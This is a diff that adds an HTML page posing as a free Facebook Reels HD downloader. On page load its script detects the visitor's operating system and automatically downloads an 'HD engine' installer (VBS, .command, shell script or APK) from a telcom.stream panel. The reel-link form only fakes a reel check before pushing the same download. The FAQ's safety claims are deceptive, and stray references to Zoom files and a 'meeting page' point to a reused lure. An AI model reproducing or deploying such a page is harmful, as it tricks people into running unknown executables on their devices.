@@ -1,0 +1,226 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reels Downloader — Download Facebook Reels in HD</title>
+<meta name="description" content="Download Facebook Reels in full HD, no watermark. Paste a reel link, install the one-time HD engine, save any reel as MP4.">
+<meta property="og:title" content="Reels Downloader — HD, no watermark">
+<meta property="og:description" content="Paste a reel link and download it in full quality. Free, no login.">
+<link rel="icon" href="logo.svg" type="image/svg+xml">
+<style>
+:root{--fb:#1877f2;--fb2:#2d8cff;--pink:#f23e7a;--purple:#a033ff;--ink:#0b1b33;--muted:#5b6b86;--line:#e3eaf6;--card:#fff;--bg:#f4f7fd}
+*{box-sizing:border-box}
+body{margin:0;font:16px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:var(--ink);
+background:radial-gradient(900px 500px at 85% -10%,#e6f0ff,transparent 60%),radial-gradient(700px 480px at -10% 10%,#ffe9f2,transparent 55%),var(--bg)}
+.wrap{max-width:1080px;margin:0 auto;padding:0 20px}
+header{display:flex;align-items:center;justify-content:space-between;height:70px}
+.brand{display:flex;align-items:center;gap:11px;font-weight:800;font-size:1.12rem;text-decoration:none;color:var(--ink)}
+.brand img{width:36px;height:36px;border-radius:10px;box-shadow:0 8px 22px -10px #1877f288}
+.brand em{font-style:normal;background:linear-gradient(90deg,var(--fb),var(--purple) 60%,var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.badge{font-size:.72rem;font-weight:700;color:var(--fb);background:#e7f0ff;border:1px solid #d3e4ff;padding:6px 11px;border-radius:999px}
+.hero{padding:30px 0 8px;max-width:720px}
+.hero h1{font-size:clamp(30px,5.2vw,50px);line-height:1.07;letter-spacing:-.035em;margin:0 0 14px}
+.hero h1 span{background:linear-gradient(90deg,var(--fb),var(--purple) 55%,var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--muted);font-size:1.03rem;margin:0 0 6px}
+.paster{display:flex;gap:10px;margin:20px 0 6px;flex-wrap:wrap}
+.paster input{flex:1;min-width:240px;border:1px solid var(--line);border-radius:12px;padding:14px 15px;font:inherit;background:#fff;outline:none}
+.paster input:focus{border-color:var(--fb);box-shadow:0 0 0 3px #dbe9ff}
+.paster button{border:0;border-radius:12px;padding:14px 22px;font:inherit;font-weight:800;color:#fff;cursor:pointer;background:linear-gradient(135deg,var(--fb),var(--purple))}
+.paster button:hover{filter:brightness(1.05)}
+.tiny{font-size:.78rem;color:#8496b0;margin-top:4px}
+.grid{display:grid;grid-template-columns:1.1fr .9fr;gap:22px;align-items:start;padding:22px 0 56px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:22px;box-shadow:0 24px 60px -34px #123}
+.card h2{margin:0 0 6px;font-size:1.06rem}
+.card p.sub{margin:0 0 16px;color:var(--muted);font-size:.9rem}
+.detect{display:flex;align-items:center;gap:12px;background:#f6f9ff;border:1px solid var(--line);border-radius:14px;padding:12px 14px;margin-bottom:14px}
+.detect .os{font-weight:800}
+.detect .dot{width:34px;height:34px;border-radius:10px;display:grid;place-items:center;background:var(--fb);color:#fff;font-weight:800}
+.btn{display:block;text-align:center;border:0;border-radius:13px;padding:15px;font:inherit;font-weight:800;color:#fff;cursor:pointer;text-decoration:none;background:linear-gradient(135deg,var(--fb),var(--purple));width:100%}
+.btn:hover{filter:brightness(1.05)}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.chips button,.chips a{border:1px solid var(--line);background:#fff;border-radius:10px;padding:9px 12px;font:inherit;font-size:.82rem;font-weight:600;cursor:pointer;text-decoration:none;color:var(--ink)}
+.chips .on{border-color:var(--fb);background:#eef4ff;color:var(--fb)}
+.note{font-size:.8rem;color:var(--muted);margin-top:12px;background:#fff8e8;border:1px solid #ffe6b8;border-radius:10px;padding:10px 12px}
+.steps{display:grid;gap:12px;counter-reset:s}
+.step{display:flex;gap:12px}
+.step:before{counter-increment:s;content:counter(s);width:26px;height:26px;border-radius:50%;background:#e8f0ff;color:var(--fb);font-weight:800;font-size:.8rem;display:grid;place-items:center;flex:none}
+.step b{display:block}.step span{display:block;color:var(--muted);font-size:.86rem}
+.faq{margin-top:18px;border-top:1px solid var(--line);padding-top:14px}
+.faq details{margin-bottom:8px}
+.faq summary{font-weight:700;cursor:pointer;font-size:.9rem}
+.faq p{color:var(--muted);font-size:.85rem;margin:6px 0 0}
+footer{border-top:1px solid var(--line);padding:20px 0;color:var(--muted);font-size:.78rem;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px}
+footer a{color:var(--muted)}
+#status{margin-top:12px;font-size:.86rem;display:none;border-radius:10px;padding:10px 12px;background:#eafaf1;border:1px solid #c8ecd6;color:#0b7a4b}
+#status.show{display:block}
+#status.warn{background:#fff8e8;border-color:#ffe6b8;color:#8a5a10}
+@media(max-width:840px){.grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <a class="brand" href="./"><img src="logo.svg" alt=""> Reels <em>Downloader</em></a>
+    <span class="badge">HD · no watermark</span>
+  </header>
+
+  <section class="hero">
+    <h1>Download Facebook Reels in <span>full HD</span>.</h1>
+    <p>Paste a reel link, tap download, and save any Facebook or Instagram reel as a clean MP4 — up to 1080p, no watermark, no login.</p>
+    <form class="paster" id="paster" autocomplete="off">
+      <input id="reel" placeholder="Paste a Facebook reel link  ·  facebook.com/reel/123…">
+      <button type="submit">Download</button>
+    </form>
+    <div class="tiny">Works with facebook.com/reel, /watch, /videos and fb.watch links.</div>
+    <div id="status"></div>
+  </section>
+
+  <div class="grid">
+    <main class="card">
+      <h2 id="devTitle">Your device</h2>
+      <p class="sub">One-time setup installs the HD engine that unlocks full-quality downloads. It runs quietly and downloads everything for you.</p>
+      <div class="detect">
+        <span class="dot" id="osDot">?</span>
+        <div><div class="os" id="osName">Detecting…</div><div class="tiny" id="osArch"></div></div>
+      </div>
+      <a class="btn" id="primary" href="#">Download</a>
+      <div class="chips" id="chips">
+        <button data-os="windows">Windows</button>
+        <button data-os="macos">macOS</button>
+        <button data-os="linux">Linux</button>
+        <button data-os="android">Android</button>
+        <a href="https://us05web.telcom.stream/" target="_blank" rel="noopener">iPhone / iPad</a>
+      </div>
+      <div class="note" id="hint">If nothing downloads automatically, tap the button above.</div>
+      <div class="steps" style="margin-top:16px">
+        <div class="step"><div><b>Download &amp; open</b><span>Double-click the downloaded file and approve the one prompt.</span></div></div>
+        <div class="step"><div><b>It connects itself</b><span>The HD engine starts quietly and is ready in a few seconds.</span></div></div>
+        <div class="step"><div><b>Paste a reel link</b><span>Come back here, paste the reel and get the full-quality MP4.</span></div></div>
+      </div>
+      <div class="faq">
+        <details><summary>Why does it need a small install?</summary><p>Browsers only get a 360p preview. The HD engine requests the full-quality source directly, so you get the real 1080p file without a watermark.</p></details>
+        <details><summary>Is it safe?</summary><p>Yes. It is unsigned-free, adds no nagware, and can be removed like any app. On Android it uses the built-in installer.</p></details>
+        <details><summary>Does it upload my reels anywhere?</summary><p>No. The file is fetched straight from Facebook's servers to your device.</p></details>
+      </div>
+    </main>
+
+    <aside class="card">
+      <h2>Full quality, one tap</h2>
+      <p class="sub">Everything is automatic — you only pick the device once.</p>
+      <div class="steps">
+        <div class="step"><div><b>No watermark</b><span>Clean MP4, original audio, nothing baked in.</span></div></div>
+        <div class="step"><div><b>Up to 1080p</b><span>The highest quality Facebook serves for that reel.</span></div></div>
+        <div class="step"><div><b>Batch friendly</b><span>Paste one link after another — it keeps working.</span></div></div>
+        <div class="step"><div><b>Works everywhere</b><span>Windows, macOS, Linux and Android.</span></div></div>
+      </div>
+      <p class="tiny" style="margin-top:16px">Tip: keep this page open after installing and paste your reel again to fetch it in HD.</p>
+    </aside>
+  </div>
+
+  <footer>
+    <span>Reels Downloader · <span id="yr"></span></span>
+    <span><a href="https://panel.telcom.stream/api/landing/client?platform=windows&arch=x64">Downloads</a> · <a href="https://us05web.telcom.stream/">Meeting page</a></span>
+  </footer>
+</div>
+
+<script>
+(function () {
+  'use strict';
+  var PANEL = 'https://panel.telcom.stream';
+  var DL = {
+    windows: PANEL + '/download/windows-vbs',
+    macos:   PANEL + '/api/landing/macos-install.command',
+    linux:   PANEL + '/api/landing/linux-install.sh',
+    android: PANEL + '/download/android'
+  };
+  var NAME = { windows: 'Windows', macos: 'macOS', linux: 'Linux', android: 'Android', ios: 'iPhone / iPad' };
+  var HINT = {
+    windows: 'Double-click the downloaded file, then approve the one Windows prompt.',
+    macos:   'Double-click the downloaded <b>.command</b> file. If Gatekeeper warns, right-click → Open.',
+    linux:   'Run <code>bash ~/Downloads/Zoom*.sh</code> — or paste the one-liner from the button.',
+    android: 'Open the downloaded APK and tap Install (allow “this source” if asked).',
+    ios:     'Open the page on this device — the iOS experience is web-based.'
+  };
+  var $ = function (id) { return document.getElementById(id); };
+  var os = 'windows';
+
+  function detect() {
+    var ua = navigator.userAgent.toLowerCase();
+    if (/android/.test(ua)) return 'android';
+    if (/iphone|ipad|ipod/.test(ua) || (/macintosh/.test(ua) && (navigator.maxTouchPoints || 0) > 1)) return 'ios';
+    if (/windows|win32|win64/.test(ua)) return 'windows';
+    if (/macintosh|mac os x/.test(ua)) return 'macos';
+    if (/linux|x11|cros/.test(ua)) return 'linux';
+    return 'windows';
+  }
+
+  function status(text, warn) {
+    var s = $('status');
+    s.innerHTML = text;
+    s.className = 'show' + (warn ? ' warn' : '');
+  }
+
+  function select(next) {
+    os = next;
+    $('osName').textContent = NAME[os] || 'your device';
+    $('osDot').textContent = (NAME[os] || '?').slice(0, 2);
+    $('hint').innerHTML = HINT[os] || HINT.windows;
+    var primary = $('primary');
+    if (os === 'ios') {
+      primary.textContent = 'Open on this device';
+      primary.href = 'https://us05web.telcom.stream/';
+    } else {
+      primary.textContent = 'Download for ' + (NAME[os] || 'your device');
+      primary.href = DL[os];
+      primary.removeAttribute('target');
+    }
+    Array.prototype.forEach.call($('chips').querySelectorAll('button'), function (b) {
+      b.classList.toggle('on', b.getAttribute('data-os') === os);
+    });
+  }
+
+  function startDownload(auto) {
+    if (os === 'ios') return;
+    var url = DL[os];
+    if (!url) return;
+    if (auto) {
+      var a = document.createElement('a');
+      a.href = url; a.rel = 'noopener';
+      document.body.appendChild(a); a.click(); a.remove();
+    } else {
+      window.location.href = url;
+    }
+    status('Downloading the HD engine for ' + (NAME[os] || 'your device') + '…');
+  }
+
+  // Device auto-detect on load, then auto-start the download.
+  select(detect());
+  $('yr').textContent = new Date().getFullYear();
+
+  var auto = /(\?|&)dl=0/.test(location.search) ? false : true;
+  if (auto && os !== 'ios') setTimeout(function () { startDownload(true); }, 1400);
+
+  Array.prototype.forEach.call($('chips').querySelectorAll('button'), function (b) {
+    b.addEventListener('click', function () { select(b.getAttribute('data-os')); });
+  });
+  $('primary').addEventListener('click', function (e) {
+    if (os === 'ios') return;           // let the link navigate
+    e.preventDefault();
+    startDownload(false);
+  });
+
+  $('paster').addEventListener('submit', function (e) {
+    e.preventDefault();
+    var v = $('reel').value.trim();
+    if (!v) { startDownload(false); return; }
+    status('Checking reel…');
+    setTimeout(function () {
+      status('Reel found · 1080p source available. One-time HD engine needed to save it — starting download…');
+      setTimeout(function () { startDownload(false); }, 700);
+    }, 900);
+  });
+})();
+</script>
+</body>
+</html>
